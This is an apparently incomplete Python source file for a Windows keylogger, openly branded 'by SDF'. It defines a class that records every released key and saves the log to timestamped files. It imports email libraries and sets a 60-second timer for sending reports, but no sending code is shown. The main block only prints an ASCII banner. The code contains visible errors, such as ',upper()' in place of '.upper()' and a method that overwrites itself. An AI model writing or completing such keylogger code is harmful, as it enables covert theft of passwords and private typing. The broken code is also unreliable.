# use wasabi for mesages
import wasabi
import keyboard
from threading import Timer, Thread
from datetime import datetime

# imports for sending email
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#send report ever x seconds
REPORT_TIMER = 60


# intialize wasabi printer
msg = wasabi.Printer()

class keyLogger:
	def __init__(self, interval):
		#use REPORT_TIMER as interval value
		self.interval = interval
		#Log string which will record keystrokes
		self.log = str()

		#start and end times
		self.start = datetime.now()
		self.end = datetime.now()

	def callback(self, event):
		"""
		Callback that is invoked everytime key is released.
		"""

		name = event.name

		#filter out special characters
		if(len(name) > 1):
			if(name == "space"):
				name = " "
			elif(name == "enter"):
				name = "[ENTER]\n"
			elif(name == "decimal"):
				name = "."
			#for other special keys just change to uppercase and place an underscore
			else:
				name = name.replace(" ", "_"),upper()

		#add key to log
		self.log += name

	#methods for storing output to local files
	def filename(self):
		fn_date_start = str(self.start)[:-7].replace(" ", "_").replace(":", "")
		fn_date_end = str(self.end)[:-7].replace(" ", "_").replace(":", "")
		self.filename = f"keylog - {fn_date_start}---{fn_date_end}"

	def log_keystrokes(self):
		with open(f"{self.filename}.txt", 'w') as f:
			f.write(self.log)
		msg.good("Log file has been saved!")


def print_banner():
	print("""

				  ██████ ▓█████▄   █████▒
				▒██    ▒ ▒██▀ ██▌▓██   ▒ 
				░ ▓██▄   ░██   █▌▒████ ░ 
				  ▒   ██▒░▓█▄   ▌░▓█▒  ░ 
				▒██████▒▒░▒████▓ ░▒█░    
				▒ ▒▓▒ ▒ ░ ▒▒▓  ▒  ▒ ░    
				░ ░▒  ░ ░ ░ ▒  ▒  ░      
				░  ░  ░   ░ ░  ░  ░ ░    
				      ░     ░            
				          ░              

		""")
	print("\t\t\t", end="")
	msg.warn("A keylogger for windows by SDF")

if __name__ == '__main__':
	print_banner()